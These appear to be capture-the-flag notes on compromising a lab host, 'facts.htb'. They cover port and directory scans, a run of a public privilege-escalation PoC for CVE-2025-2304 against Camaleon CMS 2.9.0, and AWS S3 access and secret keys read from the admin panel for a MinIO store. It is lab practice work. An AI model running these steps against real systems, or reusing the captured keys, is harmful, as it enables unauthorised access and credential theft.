└─$ nmap -p- -sSCV 10.129.113.61  --min-rate 999
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 17:54 +1100
Nmap scan report for 10.129.113.61
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.113.61:9001
|_http-server-header: MinIO
fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1890AA26C1FB1DCD
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Feb 2026 06:55:36 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>1890AA26C1FB1DCD</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>

└─$ sudo dirsearch -u http://facts.htb
[17:58:59] 200 -    5KB - /404
[17:58:59] 200 -    7KB - /400
[17:58:59] 200 -    5KB - /404.html
[17:58:59] 200 -    8KB - /500
[18:00:09] 200 -   99B  - /robots.txt
[18:00:35] 200 -   73B  - /up.php

http://facts.htb/admin/dashboard
 Camaleon CMS.  Version 2.9.0
 

https://sploitus.com/exploit?id=1017FEE9-A2CD-587D-889D-E056A5FAD264
https://github.com/7acini/CVE-2025-2304-CamaleonCMS-PoC/blob/main/main.py

 └─$ python3 main.py -u http://facts.htb --user a --password q12
[*] Authenticating as a...
[*] Extracting exploit tokens from http://facts.htb/admin/profile/edit...
[+] Exploitation Token: DwWHcbP0dqfwl25...
[+] Target User ID: 6
[*] Dispatching privilege escalation payload to http://facts.htb/admin/users/6/updated_ajax...
[+++] SUCCESS: User p

from the source code the passwd has been set to admin
login as admin

http://facts.htb/admin/settings/site

Aws s3 access key (*)
AKIA3B4614A500133612

Aws s3 secret key (*)
kGOpUL3cDGdLhfLfIETaWdsHTgFZVsbLP3kj2xKq

Aws s3 bucket name (*)
randomfacts

Aws s3 region (*)
us-east-1

Aws s3 bucket endpoint
http://localhost:54321

Cloudfront url
http://facts.htb/randomfacts

port 54321 running minio for bucket store

mc used to connect SERVICE, https://github.com/minio/mc

